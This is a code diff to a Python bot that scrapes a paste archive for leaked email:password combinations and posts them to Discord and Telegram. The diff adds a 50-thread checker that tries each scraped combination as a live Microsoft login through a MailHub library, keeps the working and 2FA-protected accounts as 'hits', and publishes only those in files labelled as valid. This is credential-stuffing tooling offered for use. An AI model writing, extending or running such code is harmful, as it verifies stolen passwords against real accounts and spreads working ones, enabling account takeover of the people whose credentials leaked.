@@ -15,6 +15,8 @@ from datetime import datetime, timezone
 from pathlib import Path
 
 import aiohttp
+import concurrent.futures
+from mailhub import MailHub
 import discord
 from discord.ext import commands, tasks
 from discord import app_commands
@@ -31,6 +33,7 @@ TELEGRAM_PUBLIC_CHAT = os.environ["TELEGRAM_PUBLIC_CHAT"]
 OWNER_ID           = int(os.environ["OWNER_ID"])
 
 CHECK_INTERVAL   = 30
+CHECKER_THREADS  = 50  # threads for hotmail checker
 PAGES_TO_SCAN    = 5
 ARCHIVE_URL      = "https://pasteview.com/paste-archive"
 SEEN_FILE        = "seen_urls.json"
@@ -116,6 +119,50 @@ def extract_credentials(raw: str) -> list[str]:
             seen.add(line)
             lines.append(line)
     return lines
+
+# ─── CHECKER ─────────────────────────────────────────────────────────────────
+def check_single(combo: str, proxies: list = []) -> tuple[str, str]:
+    """Check a single email:pass combo. Returns (combo, status)."""
+    try:
+        email, password = combo.split(":", 1)
+        checker = MailHub()
+        proxy   = None
+        for _ in range(3):
+            try:
+                r = checker.loginMICROSOFT(email, password, proxy)
+                if not r:
+                    return (combo, "INVALID")
+                if r[0] == "ok":
+                    return (combo, "VALID")
+                if r[0] == "nfa":
+                    return (combo, "2FA")
+                if r[0] == "retry":
+                    continue
+                return (combo, "INVALID")
+            except Exception:
+                import time; time.sleep(0.5)
+        return (combo, "INVALID")
+    except Exception:
+        return (combo, "INVALID")
+
+
+async def check_combos(combos: list[str]) -> list[str]:
+    """Run combos through checker in thread pool, return only valid hits."""
+    if not combos:
+        return []
+    log.info(f"Checking {len(combos)} combos with {CHECKER_THREADS} threads...")
+    loop  = asyncio.get_event_loop()
+    valid = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
+        futures = [loop.run_in_executor(pool, check_single, combo) for combo in combos]
+        results = await asyncio.gather(*futures)
+    for combo, status in results:
+        if status in ("VALID", "2FA"):
+            valid.append(combo)
+            log.info(f"✓ HIT: {combo} [{status}]")
+    log.info(f"Checking done — {len(valid)}/{len(combos)} valid")
+    return valid
+
 
 # ─── TELEGRAM ────────────────────────────────────────────────────────────────
 async def send_telegram_file(text: str, filename: str):
@@ -347,6 +394,17 @@ async def monitor_loop():
                             log.info(f"No content extracted from {url}")
 
                     if combined:
+                        # Flatten all creds and check them
+                        all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
+                        log.info(f"Running {len(all_raw)} combos through checker...")
+                        valid_hits = await check_combos(all_raw)
+
+                        if not valid_hits:
+                            log.info("No valid hits after checking, skipping post")
+                        else:
+                            combined = ["\n".join(valid_hits)]  # replace with only valid hits
+
+                    if combined:
                         output      = "\n\n".join(combined)
                         ts          = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S')
                         title_lower = " ".join(p["title"].lower() for p in new_pastes)
@@ -360,7 +418,7 @@ async def monitor_loop():
                         else:
                             label = "content"
 
-                        filename = f"{label}_{ts}.txt"
+                        filename = f"{len(valid_hits)} {label.upper()} VALID.txt"
 
                         # Discord
                         if toggles["discord_content"]:
